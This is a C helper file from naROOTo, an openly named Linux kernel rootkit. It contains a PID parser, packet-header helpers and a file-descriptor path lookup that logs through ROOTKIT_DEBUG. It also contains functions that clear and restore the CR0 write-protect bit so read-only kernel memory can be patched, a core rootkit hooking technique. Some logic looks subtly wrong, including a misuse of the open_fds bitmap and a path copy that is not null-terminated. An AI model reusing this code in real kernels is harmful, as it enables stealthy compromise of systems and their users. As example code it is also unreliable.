/******************************************************************************
 *
 * Name: include.c 
 * This file contains many different helper functions that are needed
 * throughout the program.
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/dcache.h>
#include <linux/fdtable.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/spinlock.h>

#include "include.h"

static spinlock_t cr0_lock;
static unsigned long cr0_lock_flags;

/*
 * Converts a string PID to an int.
 */
int convert_atoi(char *str)
{
	int res = 0;
	int mul = 1;
	char *ptr;

	for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
		if (*ptr < '0' || *ptr > '9')
			return (-1);
		res += (*ptr - '0') * mul;
		mul *= 10;
	}
	return (res);
}

/*
 * Disable the writing protection for the whole processor.
 */
void disable_page_protection(void)
{
	spin_lock_irqsave(&cr0_lock, cr0_lock_flags);
	unsigned long value;
	asm volatile ("mov %%cr0,%0":"=r" (value));
	if (value & 0x00010000) {
		value &= ~0x00010000;
		asm volatile ("mov %0,%%cr0"::"r" (value));
	}
}

/*
 * Reenable the writing protection for the whole processor.
 */
void enable_page_protection(void)
{
	unsigned long value;
	asm volatile ("mov %%cr0,%0":"=r" (value));
	if (!(value & 0x00010000)) {
		value |= 0x00010000;
		asm volatile ("mov %0,%%cr0"::"r" (value));
	}
	spin_unlock_irqrestore(&cr0_lock, cr0_lock_flags);
}

/* 
 * Return the pointer to the transport layer header for an IPv4 packet.
 */
void *ipv4_get_transport_hdr(struct iphdr *ip_header)
{
	return ((__u32 *) ip_header + ip_header->ihl);
}

/* 
 * Return the pointer to the transport layer header for an IPv6 packet.
 */
void *ipv6_get_transport_hdr(struct ipv6hdr *ipv6_header)
{
	return ((__u32 *) ipv6_header + 10);
}

/*
 * Gets the absolute path to a file identified by fd.
 */
ssize_t get_path(unsigned int fd, char *path, size_t bufsiz)
{
	struct fdtable *fdtable;
	struct path file_path;
	size_t path_len;
	char *cwd;
	char *buf = (char *)kmalloc(1024 * sizeof(char), GFP_KERNEL);
	ssize_t retv = 0;

	fdtable = files_fdtable(current->files);
	if (fd >= *(fdtable->open_fds)) {
		ROOTKIT_DEBUG("Error in get_path(): fd >= open_fds");
		retv = -EBADF;
		goto out;
	}

	file_path = fdtable->fd[fd]->f_path;
	cwd = d_path(&file_path, buf, 1024 * sizeof(char));
	if (IS_ERR(cwd)) {
		retv = PTR_ERR(cwd);
		ROOTKIT_DEBUG
		    ("Error in get_path() - d_path failed with error code %li",
		     retv);
		goto out;
	}
	path_len = strlen(cwd);

	/* check whether the supplied buffer is big enough */
	if (path_len > bufsiz) {
		retv = -ENOMEM;
		goto out;
	}

	memcpy(path, cwd, path_len);
	retv = strlen(cwd);
 out:
	/* cleanup and return */
	kfree(buf);
	return retv;
}
